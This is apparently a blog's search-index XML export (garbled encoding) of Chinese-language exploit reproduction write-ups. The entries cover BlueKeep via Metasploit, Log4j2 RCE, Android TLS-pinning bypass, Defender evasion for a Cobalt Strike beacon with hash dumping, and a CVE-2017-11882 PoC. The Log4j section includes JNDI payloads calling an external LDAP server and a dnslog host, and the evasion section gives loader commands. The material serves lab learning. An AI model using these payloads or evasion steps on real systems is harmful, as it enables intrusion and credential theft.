<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0708 - CVE-2019-0708 å¤ç°</title>
    <url>/2019/10/12/0708-CVE-2019-0708-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="0x01-å‡†å¤‡ç¯å¢ƒ"><a class="header-anchor" href="#0x01-å‡†å¤‡ç¯å¢ƒ">Â¶</a>0x01 å‡†å¤‡ç¯å¢ƒ</h2>
<p>2019å¹´9æœˆ7æ—¥æ™šä¸Šå‡Œæ™¨1ç‚¹ï¼Œgithubä¸Šå‘å¸ƒäº†0708çš„æ¼æ´åˆ©ç”¨ç¨‹åºï¼Œçœ‹äº†åˆ«äººçš„å¤ç°å’Œè®¨è®ºï¼Œæ„Ÿè§‰ä¸å¤ªå¥½ç”¨ï¼Œæ‡’å¾—å¤ç°ï¼Œè¿™ä¸¤å¤©é—²äº†ï¼Œå¤ç°å‡ºæ¥å‘å‘åšå®¢ï¼Œå¥½ä¹…æ²¡å‘äº†ï¼Œä¸»è¦æ˜¯æ²¡å•¥æ–°ä¸œè¥¿å¯ä»¥å‘ï¼Œä¸æ–¹ä¾¿å‘</p>
<h3 id="ä¸‹è½½æ”»å‡»å¥—ä»¶"><a class="header-anchor" href="#ä¸‹è½½æ”»å‡»å¥—ä»¶">Â¶</a>ä¸‹è½½æ”»å‡»å¥—ä»¶</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></tbody></table></figure>
<p>æ‹·è´åˆ°<code>metasploit</code>å¯¹åº”ç›®å½•ä¸‹ï¼Œæˆ‘è¿™é‡Œæ˜¯<code>kali</code>è‡ªå¸¦çš„ç›®å½•</p>
<div class="note info"><p>é˜…è¯»æœ¬ç¯‡æ–‡ç« èƒ½äº†è§£åˆ°ï¼š<span class="label success">0708</span>, <span class="label success">msf</span></p></div>
<span id="more"></span>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/</span><br><span class="line"><span class="built_in">cp</span> rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/</span><br><span class="line"><span class="built_in">cp</span> cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/rdp/</span><br><span class="line"><span class="built_in">cp</span> cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp</span><br></pre></td></tr></tbody></table></figure>
<h3 id="æ›´æ–°msf"><a class="header-anchor" href="#æ›´æ–°msf">Â¶</a>æ›´æ–°msf</h3>
<p>æˆ‘æ˜¯ä½¿ç”¨<code>kali2.0 1902</code>ç‰ˆæœ¬çš„<code>msf</code>ï¼Œå…ˆæ›´æ–°ï¼Œè®°å¾—ä½¿ç”¨<code>proxychains</code>ï¼Œä¸ç„¶æ€ä¹ˆéƒ½æ›´æ–°å¤±è´¥å“¦</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gedit /etc/proxychains.conf</span><br><span class="line">proxychains /bin/bash</span><br><span class="line">apt update; apt install metasploit-framework</span><br></pre></td></tr></tbody></table></figure>
<h2 id="0x02-é…ç½®"><a class="header-anchor" href="#0x02-é…ç½®">Â¶</a>0x02 é…ç½®</h2>
<p>å¯åŠ¨<code>msf</code>ï¼Œé‡è½½<code>0708</code>åˆ©ç”¨æ¨¡å—</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">reload_all</span><br></pre></td></tr></tbody></table></figure>
<p>é‡è½½å®Œæˆ<code>search</code>ä¸€ä¸‹ï¼Œæ‰¾åˆ°åˆšæ‰æ·»åŠ çš„ï¼Œå¹¶å¼€å§‹åˆ©ç”¨</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">search 0708</span><br><span class="line">use exploit/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">show options</span><br></pre></td></tr></tbody></table></figure>
<p><img src="search.png" alt="search"></p>
<p>çœ‹åˆ°é€‰é¡¹ï¼Œåªæœ‰ä¿©éœ€è¦è®¾ç½®ï¼Œ<code>RHOSTS</code>ã€<code>target</code></p>
<blockquote>
<ul>
<li>RHOSTS: ç›®æ ‡åœ°å€</li>
<li>target: å¯é€‰ä¸º0-4ï¼Œè®¾ç½®å—å®³æœºæœºå™¨æ¶æ„</li>
</ul>
</blockquote>
<h2 id="0x03-exploit"><a class="header-anchor" href="#0x03-exploit">Â¶</a>0x03 exploit</h2>
<p>ç›®æ ‡æœºå™¨ä¸º<code>win7 ä¸“ä¸šç‰ˆ</code>ï¼Œå°è¯•5ä¸ª<code>target</code></p>
<p><img src="target_0.png" alt="search"><br>
<img src="target_1.png" alt="target_1"><br>
<img src="target_2.png" alt="target_2"><br>
<img src="target_3.png" alt="target_3"><br>
<img src="target_4.png" alt="target_4"></p>
<p>ä»<code>options</code>ä¸­çš„<code>target</code>å¯ä»¥æ¸…æ¥šçœ‹åˆ°<code>0-4</code>å„ä¸ªå¯¹åº”ä»€ä¹ˆï¼Œå¾ˆæœ‰é’ˆå¯¹æ€§ï¼Œåæ­£æ˜¯å„ç§è™šæ‹Ÿæœºï¼Œå‘µå‘µ<br>
ç»“æœå¯æƒ³è€ŒçŸ¥ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯è“å±</p>
<p><img src="blue.png" alt="blue"></p>
<p>æ ¹æ®çå­è€å“¥çš„å¤ç°ï¼Œæˆ‘å†³å®šæ›´æ¢æ——èˆ°ç‰ˆè¯•è¯•ï¼Œè¯•äº†ä¸€éè¿˜æ˜¯è“å±ï¼Œçœ‹åˆ°ä»–è¯´<code>é…ç½®è®¾ç½®æˆ2æ ¸2g</code>ï¼Œæˆ‘æ”¹æˆå¦‚ä¸‹å›¾é…ç½®</p>
<p><img src="config.png" alt="config"></p>
<p><code>0-4</code>å†æ¬¡å°è¯•ä¸€éï¼Œåœ¨<code>target=3</code>æ—¶ï¼ŒæˆåŠŸå¼¹å›</p>
<p><img src="success.png" alt="success"></p>
<h2 id="0x04-æ€»ç»“"><a class="header-anchor" href="#0x04-æ€»ç»“">Â¶</a>0x04 æ€»ç»“</h2>
<p>é£Ÿä¹‹æ— å‘³ï¼Œå¼ƒä¹‹å¯æƒœï¼Œçº¯å±é¸¡è‚‹ï¼Œçœ‹åˆ°<code>target</code>é’ˆå¯¹é‚£ä¹ˆå¤šéƒ½æ˜¯è™šæ‹Ÿæœºå°±çŸ¥é“</p>
<p>ä»<code>0708</code>æ¶ˆæ¯å‡ºæ¥åˆ°<code>exp</code>ç»è¿‡3ä¸ªæœˆå·¦å³æ—¶é—´å§ï¼Œå´åªæ‹¿åˆ°è¿™ä¹ˆä¸ªé¸¡è‚‹<code>exp</code>ï¼Œä»¤äººå”å˜˜ï¼Œçœ‹çœ‹åæœŸæ˜¯å¦æœ‰å¥½ç”¨çš„å§</p>
<p>å¦å¤–ï¼Œ<code>2008</code>å¬è¯´è¿˜è¦ä¿®æ”¹æ³¨å†Œè¡¨æ‰èƒ½æˆåŠŸï¼Ÿé»‘äººé—®å·ï¼Ÿï¼Ÿï¼Ÿå€ºè§ï¼Œæµªè´¹ç»³å‘½çš„ä¸œè¥¿å°±ä¸æŠ˜è…¾äº†</p>
<h2 id="0x05-å‚è€ƒé“¾æ¥"><a class="header-anchor" href="#0x05-å‚è€ƒé“¾æ¥">Â¶</a>0x05 å‚è€ƒé“¾æ¥</h2>
<p><a href="https://www.t00ls.net/viewthread.php?tid=52701&amp;highlight=0708">https://www.t00ls.net/viewthread.php?tid=52701&amp;highlight=0708</a></p>
]]></content>
      <tags>
        <tag>CVE</tag>
        <tag>å¤ç°</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache - Log4j2 RCEå¤ç°</title>
    <url>/2021/12/11/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<img src="/2021/12/11/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/icloud.png" class="">
<h2 id="ç¯å¢ƒæ­å»º"><a class="header-anchor" href="#ç¯å¢ƒæ­å»º">Â¶</a>ç¯å¢ƒæ­å»º</h2>
<p>ä½¿ç”¨<code>T00ls</code>å¤§ä½¬çš„ç¯å¢ƒï¼Œ<code>war</code>åŒ…æ”¾åˆ°<code>webapps</code>ä¸‹é‡å¯<code>tomcat</code>å³å¯</p>
<div class="note info"><p>é˜…è¯»æœ¬ç¯‡æ–‡ç« èƒ½äº†è§£åˆ°ï¼šapache, rceï¼ŒLog4j2</p></div>
<span id="more"></span>
<blockquote>
<p><a href="https://www.t00ls.cc/viewthread.php?tid=63695&amp;extra=&amp;page=1">https://www.t00ls.cc/viewthread.php?tid=63695&amp;extra=&amp;page=1</a></p>
</blockquote>
<p>è¿™é‡Œæˆ‘è¦å¤šè¯´å‡ å¥ï¼Œå› ä¸ºæˆ‘ç”¨çš„<code>jspstudy</code>ï¼Œæ­å»ºç¯å¢ƒè¸©äº†ä¸å°‘å‘ï¼Œè®°å½•ä¸‹ï¼Œä¸»è¦æ˜¯<code>jspstudy</code>çš„å‘</p>
<p>é¦–å…ˆæŠŠ<code>war</code>åŒ…æ”¾åˆ°<code>webapps</code>ä¸‹å¹¶ä¸ä¼šè‡ªè§£å‹ï¼Œæ”¾åˆ°<code>www</code>ä¸€æ ·ä¸è§£å‹</p>
<p>è§£å†³æ–¹æ¡ˆï¼š<code>JspStudy\tomcat\conf</code>æ–‡ä»¶å¤¹ä¸‹<code>server.xml</code>ï¼Œæ³¨é‡Šæ‰<code>&lt;Context docBase="D:\JspStudy\WWW\" path=""&gt;&lt;/Context&gt;</code>ï¼Œæ”¾åˆ°<code>webapps</code>å³å¯è‡ªè§£å‹</p>
<p>è®¾ç½®æ ¹ç›®å½•ä¸º<code>D:\JspStudy\WWW\ROOT</code>ï¼Œè®¿é—®<code>http://127.0.0.1:8080</code>ï¼Œé¡µé¢æ­£å¸¸</p>
<p>æäº¤<code>payload</code>ï¼ŒæŠ¥500é”™</p>
<p><img src="500.png" alt="500"></p>
<p>ç»æŸ¥ï¼Œå¤§æ¦‚æ˜¯<code>jdk</code>ç‰ˆæœ¬é—®é¢˜ï¼Œæ‰“å¼€<code>jdk</code>ç›®å½•æŸ¥çœ‹<code>java</code>ç‰ˆæœ¬ä¸º<code>1.7.0_60</code>ï¼Œç›²çŒœç‰ˆæœ¬è¿‡ä½</p>
<p>è§£å†³æ–¹æ¡ˆï¼šå®‰è£…<code>jre1.8</code>32ä½ï¼Œæ‹·è´<code>bin</code>ã€<code>lib</code>ç›®å½•ï¼Œæ›¿æ¢<code>JspStudy\JDK\jre\</code>ï¼Œæ›¿æ¢å‰å…ˆæŠŠ<code>bin</code>ç›®å½•ä¸‹<code>java-JspStudy.exe</code>å¤‡ä»½ä¸€ä»½ï¼Œæ›¿æ¢åå†æ‹·è´è¿›å»</p>
<p>é‡å¯<code>tomcat</code>è§£å†³500é”™è¯¯ï¼Œ8é”™ï¼Œniceï¼Œæˆ‘å·²ç»å‡†å¤‡ä¸å†ç”¨ä»–äº†ğŸ˜…</p>
<h2 id="RCE"><a class="header-anchor" href="#RCE">Â¶</a>RCE</h2>
<h3 id="1-dnslog"><a class="header-anchor" href="#1-dnslog">Â¶</a>1. dnslog</h3>
<p>å…ˆä½¿ç”¨dnsæµ‹è¯•æ¼æ´</p>
<blockquote>
<p>payload: ${jndi:ldap://redn3ck.xxx.ceye.io}</p>
</blockquote>
<p><img src="dns.png" alt="dns"></p>
<h3 id="2-rce"><a class="header-anchor" href="#2-rce">Â¶</a>2. rce</h3>
<p>ä¸‹è½½<a href="https://github.com/0x727/JNDIExploit">https://github.com/0x727/JNDIExploit</a>ï¼Œè·‘èµ·æœåŠ¡</p>
<p><img src="JNDIExploit.png" alt="JNDIExploit"></p>
<blockquote>
<p>payload: ${jndi:ldap://207.xxx.xxx.111:1389/TomcatBypass/TomcatEcho}</p>
</blockquote>
<p><code>header</code>ä¸­å¡«å…¥<code>Cmd: cmd</code>å³å¯<code>rce</code></p>
<p><img src="rce.png" alt="rce"></p>
<h2 id="å‚è€ƒé“¾æ¥"><a class="header-anchor" href="#å‚è€ƒé“¾æ¥">Â¶</a>å‚è€ƒé“¾æ¥</h2>
<blockquote>
<p><a href="https://www.t00ls.cc/viewthread.php?tid=63695">https://www.t00ls.cc/viewthread.php?tid=63695</a><br>
<a href="https://www.t00ls.cc/viewthread.php?tid=63705">https://www.t00ls.cc/viewthread.php?tid=63705</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>å¤ç°</tag>
        <tag>apache</tag>
        <tag>rce</tag>
        <tag>Log4j2</tag>
      </tags>
  </entry>
  <entry>
    <title>ApkæŠ“åŒ… - æŠ“ä¸åˆ°è§£å†³æ–¹æ¡ˆ</title>
    <url>/2022/11/02/Apk%E6%8A%93%E5%8C%85-%E6%8A%93%E4%B8%8D%E5%88%B0%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<h2 id="0x01-å‰è¨€"><a class="header-anchor" href="#0x01-å‰è¨€">Â¶</a>0x01 å‰è¨€</h2>
<p>å¾ˆå¤š <code>apk</code> è®¾ç½®ä»£ç†åï¼ŒæŠ“åŒ…éƒ½ä¼šå‡ºç°æ²¡æœ‰åŒ…çš„æƒ…å†µï¼Œä¸€éƒ¨åˆ†åŸå› å°±æ˜¯ä½¿ç”¨ <code>so</code> æ–‡ä»¶ <code>https</code></p>
<p>ç»è¿‡å¤§ä½¬çš„ä¸€é€šç ”ç©¶åï¼Œç”¨äº†æ„æƒ³ä¸åˆ°çš„è§£å†³æ–¹æ¡ˆçªç ´äº†è¯¥é—®é¢˜ï¼Œé«˜ï¼Œå®åœ¨æ˜¯é«˜ï¼Œå­¦ä¹ å¹¶è®°å½•</p>
<h2 id="0x02-è§£å†³æ–¹æ¡ˆ"><a class="header-anchor" href="#0x02-è§£å†³æ–¹æ¡ˆ">Â¶</a>0x02 è§£å†³æ–¹æ¡ˆ</h2>
<p>æ­£å¸¸æŠ“åŒ…ï¼Œæ¨¡æ‹Ÿå™¨é…ç½®å¥½ä»£ç†å’Œ <code>fiddler</code> ï¼Œæˆ‘è¿™ç”¨çš„å¤œç¥ï¼Œ<code>magisk+LSP+justTrustme</code> åå¼€å§‹æŒ‰ç…§æ­£å¸¸æµç¨‹æŠ“åŒ…ï¼Œå¯è§æ— ä»»ä½•æµé‡</p>
<h3 id="1-æŸ¥æ‰¾åŸŸå"><a class="header-anchor" href="#1-æŸ¥æ‰¾åŸŸå">Â¶</a>1. æŸ¥æ‰¾åŸŸå</h3>
<p><code>winrar</code> è§£åŒ… <code>apk</code> ï¼Œä½¿ç”¨ <code>npp</code> æœç´¢ç›¸å…³åŸŸåï¼Œæœå‡º3å¤„ <code>so</code> æ–‡ä»¶ï¼Œåœ¨å…¶ä¸­æœç´¢ <code>https</code> åŒ…å«å¤§é‡è¯·æ±‚</p>
<span id="more"></span>
<p><img src="npp.png" alt="npp"></p>
<h3 id="2-æ›¿æ¢https"><a class="header-anchor" href="#2-æ›¿æ¢https">Â¶</a>2. æ›¿æ¢https</h3>
<p>ä½¿ç”¨å¦‚ä¸‹ <code>py</code> ä»£ç æ›¿æ¢ <code>https</code> ä¸º <code>http</code>ï¼Œæ›¿æ¢ä¸Šè¿°3ä¸ªæ–‡ä»¶</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">t = <span class="built_in">open</span>(<span class="string">r'libapp.so'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">t = re.sub(<span class="string">b'https://([\d\w\.]*?)/'</span>,<span class="string">b'http://\\1//'</span>,t)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">'libapp.so'</span>,<span class="string">'wb'</span>).write(t)</span><br></pre></td></tr></tbody></table></figure>
<h3 id="3-æ›¿æ¢soæ–‡ä»¶"><a class="header-anchor" href="#3-æ›¿æ¢soæ–‡ä»¶">Â¶</a>3. æ›¿æ¢soæ–‡ä»¶</h3>
<p>å°†æ›´æ”¹çš„<code>so</code>æ–‡ä»¶æ›¿æ¢åˆ°<code>app</code>å¯¹åº”ç³»ç»Ÿç›®å½•ä¸‹ï¼Œå¦‚æœæœ‰å°±æ›¿æ¢ï¼Œæ²¡æœ‰å°±ç›´æ¥æ”¾å…¥</p>
<blockquote>
<p>/data/app/[app å]/</p>
</blockquote>
<p><img src="mt.png" alt="mt"></p>
<h3 id="4-æŠ“åŒ…"><a class="header-anchor" href="#4-æŠ“åŒ…">Â¶</a>4. æŠ“åŒ…</h3>
<p>æ‰“å¼€appï¼ŒæŸ¥çœ‹<code>proxifier</code>èµ°å‘å¯çœ‹åˆ°<code>ip</code>èµ°å‘å·²ä»<code>443</code>å˜ä¸º<code>80</code>ï¼Œè¯æ˜soæ–‡ä»¶åŠ è½½æˆåŠŸ</p>
<p><img src="80.png" alt="80"></p>
<p><code>proxifier</code>æ·»åŠ <code>http</code>è§„åˆ™ï¼Œä½¿è¯¥<code>ip</code>ä»£ç†åˆ°fiddler</p>
<p><img src="rules.png" alt="rules"></p>
<h3 id="5-æ›¿æ¢http"><a class="header-anchor" href="#5-æ›¿æ¢http">Â¶</a>5. æ›¿æ¢http</h3>
<p><code>ctrl+r</code>æ‰“å¼€ <code>fiddler</code> è„šæœ¬ï¼Œåœ¨<code>OnBeforeRequest</code>å‡½æ•°å†…æ·»åŠ å¦‚ä¸‹ä»£ç ï¼Œå³ä¸ºæŠŠ<code>http</code>è¯·æ±‚æ›´æ”¹ä¸º<code>https</code></p>
<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// https2http</span></span><br><span class="line"><span class="keyword">if</span>(oSession.oRequest.headers.UriScheme == <span class="string">"http"</span> &amp;&amp; oSession.PathAndQuery.<span class="built_in">IndexOf</span>(<span class="string">"/"</span>) &gt;= <span class="number">0</span>){</span><br><span class="line">	<span class="keyword">while</span>(oSession.PathAndQuery.<span class="built_in">StartsWith</span>(<span class="string">"//"</span>)) {</span><br><span class="line">		oSession.PathAndQuery = oSession.PathAndQuery.<span class="built_in">Replace</span>(<span class="string">"//"</span>,<span class="string">"/"</span>)</span><br><span class="line">	}</span><br><span class="line">	oSession[<span class="string">"ui-backcolor"</span>] = <span class="string">"#999bdd"</span>;</span><br><span class="line">	oSession.oRequest.headers.UriScheme = <span class="string">"https"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>fiddlerå³å¯æ­£å¸¸æŠ“åŒ…</p>
<p><img src="fiddler.png" alt="fiddler"></p>
<h2 id="0x03-æ€»ç»“"><a class="header-anchor" href="#0x03-æ€»ç»“">Â¶</a>0x03 æ€»ç»“</h2>
<p>è¯¥æ–¹æ¡ˆå°†<code>https</code>æ›¿æ¢æˆ<code>http</code>ï¼Œæ²¡äº†è¯ä¹¦è‡ªç„¶æŠ“å¾—åˆ°åŒ…ï¼Œæœ€åå†é€šè¿‡fiddleræ›¿æ¢å›å»ï¼Œå®ç°appçš„æ­£å¸¸è¿è¡Œï¼Œå±äºå¥‡æŠ€æ·«å·§äº†</p>
<p>åªè¦åŠŸå¤«æ·±ï¼Œé“æµç£¨æˆé’ˆï¼Œå¤§ä½¬yyds</p>
<p>æœ€åè´´ä¸€ä¸ªå¤§ä½¬è¢«è‡ªå·±æ€è·¯æŠ˜æœçš„ç”»é¢ï¼Œæ— æ•Œï¼ğŸ™Œ</p>
<p><img src="wechat.png" alt="wechat"></p>
]]></content>
      <tags>
        <tag>apk</tag>
        <tag>æŠ“åŒ…</tag>
        <tag>æ¨¡æ‹Ÿå™¨</tag>
        <tag>so</tag>
      </tags>
  </entry>
  <entry>
    <title>CSå…æ€ - bypass defender</title>
    <url>/2022/08/09/CS%E5%85%8D%E6%9D%80-bypass-defender/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>æœ€è¿‘çœ‹åˆ°ä¸€æ¬¾è¿‡ <code>defender</code> çš„å…æ€å·¥å…·ï¼ŒæŒºæ„Ÿå…´è¶£ï¼Œä¹‹æ‰€ä»¥æ„Ÿå…´è¶£çš„åŸå› æ˜¯æˆ‘è§‰å¾—ç›®å‰æœ€å¼ºçš„æ€è½¯å°±æ˜¯<code>defender</code></p>
<p>å¤–é¢æœ‰å¾ˆå¤šè¿‡ç«ç»’ã€360ä¹‹ç±»çš„ï¼Œä¸æ„Ÿå…´è¶£ï¼Œå› ä¸ºç”¨æ­¦ä¹‹åœ°ä¸å¤§ï¼Œè€Œä¸”è‡ªå¸¦çš„ <code>defender</code> æ›´å¼ºåŠ›ï¼Œè¿‡ <code>defender</code> çš„æ„ä¹‰æ›´å¤§</p>
<p><strong>Xç³»åˆ—å®‰å…¨å·¥å…·-AVå…æ€æ¡†æ¶-BypassAV</strong></p>
<blockquote>
<p><a href="https://github.com/XTeam-Wing/X-AV">https://github.com/XTeam-Wing/X-AV</a></p>
</blockquote>
<p>å…·ä½“ä»‹ç»å°±ä¸èµ˜è¿°äº†ï¼Œçœ‹ <code>README</code> å°±å¥½</p>
<h2 id="å®‰è£…"><a class="header-anchor" href="#å®‰è£…">Â¶</a>å®‰è£…</h2>
<p>ç°åœ¨ <code>go</code> æ—¥è¶‹ç«çƒ­ï¼Œä¸å­¦ç‚¹çœŸçš„è·Ÿä¸ä¸Šäº†ï¼Œè¿™æ¬¾å·¥å…·ä¹Ÿæ˜¯ <code>go</code> å¼€å‘çš„</p>
<span id="more"></span>
<h3 id="go"><a class="header-anchor" href="#go">Â¶</a>go</h3>
<p>ä¸èµ˜è¿°ï¼Œæˆ‘è¿™é‡Œå®‰è£…çš„æ˜¯æ–°ç‰ˆ <code>go1.18.3</code>ï¼Œæ‰€ä»¥å¯¼è‡´è·‘ä»–çš„ç¨‹åºæœ‰å¾ˆå¤šé—®é¢˜ï¼Œä½†åˆä¸æƒ³é™çº§ï¼Œæ‰€ä»¥å°±ä¸€æ­¥æ­¥æ’æŸ¥ï¼Œè§£å†³é—®é¢˜ï¼Œæ­»ç£•</p>
<h3 id="run"><a class="header-anchor" href="#run">Â¶</a>run</h3>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ShellcodeFrameWork_windows_amd64.exe -shellcodepath mimikatz.exe -o rc4.exe -key wing -encrypt  rc4 -loadermethod uuid</span><br></pre></td></tr></tbody></table></figure>
<p>ç›´æ¥è·‘æç¤º <code>ERROR:exec: "bin/go": file does not exist</code></p>
<p>çœ‹æ¥ç¯å¢ƒå˜é‡æ²¡å†™å¥½ï¼Œæ‰€ä»¥æŠŠç¨‹åºæ”¾åˆ° <code>go</code> ç›®å½• <code>C:\Program Files\Go</code> å†æ¬¡è¿è¡Œï¼Œæç¤º <code>STDERR: UUID_agent.go:33:2: cannot find package "github.com/google/uuid" in any of:</code></p>
<p>ä½¿ç”¨ <code>go get github.com/google/uuid </code> æŠ¥é”™ï¼ŒæŒ‰æç¤ºæ”¹ä¸º <code>go install github.com/google/uuid@latest</code> æŠ¥é”™ <code>package github.com/google/uuid is not a main package</code> ï¼ŒæŸ¥äº†ä¸€åœˆæŠ˜è…¾äº†å¾ˆä¹…</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong></p>
<p>åœ¨ç›®å½• <code>C:\Program Files\Go\src\</code> ä¸‹æ‰‹åŠ¨åˆ›å»º <code>github.com/google/</code> ï¼Œä¹‹å <code>git clone https://github.com/google/uuid.git</code>ï¼Œè§£å†³è¯¥é—®é¢˜</p>
<p>å‰©ä¸‹çš„æŠ¥é”™åŒç†è§£å†³</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\Program Files\Go\src\golang.org\x&gt;git clone https://github.com/golang/crypto.git</span><br><span class="line">C:\Program Files\Go\src\golang.org\x&gt;git clone https://github.com/golang/sys.git</span><br></pre></td></tr></tbody></table></figure>
<p>è‡³æ­¤ï¼Œç¨‹åºè·‘èµ·æ¥ï¼Œè§£å†³é«˜ç‰ˆæœ¬ <code>go</code> è¿è¡Œé—®é¢˜</p>
<h2 id="å…æ€æ•ˆæœ"><a class="header-anchor" href="#å…æ€æ•ˆæœ">Â¶</a>å…æ€æ•ˆæœ</h2>
<p>ä¸€å¼€å§‹æˆ‘å…æ€<code>mmk</code>ï¼Œä½†è·‘ä¸èµ·æ¥ï¼Œæ‰å‘ç°è¯¥å·¥å…·ä¸º <code>shellcode</code> å…æ€ ğŸ˜…</p>
<p>ç”Ÿæˆä¸€ä¸ª <code>Windows stageless Raw</code> ç”¨ <code>aes</code> åŠ å¯†ä¸€ä¸ªè¯•è¯•çœ‹å…æ€æ•ˆæœ</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\Program Files\Go&gt;x-av.exe -shellcodepath C:\Users\admin\Desktop\beacon.bin -key redn3ck -encrypt aes -loadermethod uuid -salt wakuwaku -o aes.exe</span><br></pre></td></tr></tbody></table></figure>
<p>æˆ‘ç›´æ¥æ”¾åˆ°ä¸»æœºæµ‹è¯•ï¼Œä¸»æœºæ˜¯ä¸€ç›´åœ¨æ›´æ–°çš„ <code>win10</code>ï¼Œ <code>defender</code> ä¹Ÿæ˜¯æœ€æ–°çš„</p>
<p><img src="defender.png" alt="defender"></p>
<p>æœ¬èº«ç¨‹åºæ²¡æŠ¥æ¯’æ²¡ä»€ä¹ˆï¼Œè·‘èµ·æ¥åä¹Ÿæ²¡æŠ¥ï¼Œ<code>defender</code> é˜µäº¡ï¼Œå…æ€æ•ˆæœä¸é”™ï¼Œå¦å¤–è´´ä¸Šç³»ç»Ÿç‰ˆæœ¬ä¸º <code>19044.1826</code></p>
<p><img src="systeminfo.png" alt="systeminfo"></p>
<p><code>CS</code> æˆåŠŸä¸Šçº¿</p>
<p><img src="cs.png" alt="cs"></p>
<h3 id="æŠ“å¯†ç "><a class="header-anchor" href="#æŠ“å¯†ç ">Â¶</a>æŠ“å¯†ç </h3>
<p>å¤§èƒ†æµ‹è¯•ä¸€ä¸‹æŠ“å¯†ç ï¼ŒçŒœæµ‹ä¸å¯ä»¥ï¼Œç»“æœæ²¡æƒ³åˆ°æˆåŠŸæŠ“åˆ°å¯†ç </p>
<p><img src="hashdump.png" alt="hashdump"></p>
<p>ä½†å¯æƒœçš„æ˜¯è¿™æ¬¡ <code>defender</code> å¤æ´»äº†ï¼Œæ£€æµ‹åˆ°æ¶æ„ç¨‹åºï¼Œå¹¶ä¸”å¼¹çª—å¼ºåˆ¶<code>1min</code>åå…³æœºï¼Œæˆ‘ä¸ç†è§£ ä½†æˆ‘å¤§å—éœ‡æ’¼.jpg</p>
<h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">Â¶</a>æ€»ç»“</h2>
<p>è¯¥å·¥å…·å…æ€æ•ˆæœä¸é”™ï¼Œç›¸ä¿¡è¿‡äº† <code>defender</code>ï¼Œå…¶ä»– <code>AV</code> ä¹Ÿä¸å¿…æµ‹è¯•äº†</p>
<p>åªè¦ä¸åšä¸€äº›æ•æ„Ÿè¡Œä¸ºï¼Œè¿˜æ˜¯å¯ä»¥è¾¾åˆ°ä¸€å®šæ•ˆæœ</p>
]]></content>
      <tags>
        <tag>cs</tag>
        <tag>å…æ€</tag>
        <tag>defender</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-11882 POC</title>
    <url>/2017/11/21/CVE-2017-11882-POC/</url>
    <content><![CDATA[<h1>POC</h1>
<p><a href="https://github.com/embedi/CVE-2017-11882">https://github.com/embedi/CVE-2017-11882</a></p>
<p>å¦‚ä½•ä½¿ç”¨ï¼Œä½œè€…githubé‡Œå†™çš„å¾ˆæ¸…æ¥š</p>
<p>é™„ä¸Šè‡ªæµ‹gif</p>
<img src="/2017/11/21/CVE-2017-11882-POC/exp.gif" class="">
<h1>BTW</h1>
<p>ç°åœ¨æ­¤æ¼æ´è¢«å† ä¸Šå…¨ç‰ˆæœ¬é€šæ€çš„åå·ï¼Œä½œè€…ä¹Ÿæ”¾å‡º3ä¸ªç‰ˆæœ¬çš„è§†é¢‘ï¼Œä½†æˆ‘æœ¬åœ°æµ‹è¯•ï¼Œå´åœ¨2016ä¸‹æœªæˆåŠŸ</p>
<p>å…·ä½“ç¯å¢ƒï¼šwin10 [10.0.16299.64] + ç ´è§£æ¿€æ´»è¿‡çš„office2016</p>
]]></content>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-1472 - Zerologonå¤ç°+çªç ´445</title>
    <url>/2020/10/16/CVE-2020-1472-Zerologon%E5%A4%8D%E7%8E%B0+%E7%AA%81%E7%A0%B4445/</url>
    <content><![CDATA[<h2 id="0x01-å‰è¨€"><a class="header-anchor" href="#0x01-å‰è¨€">Â¶</a>0x01 å‰è¨€</h2>
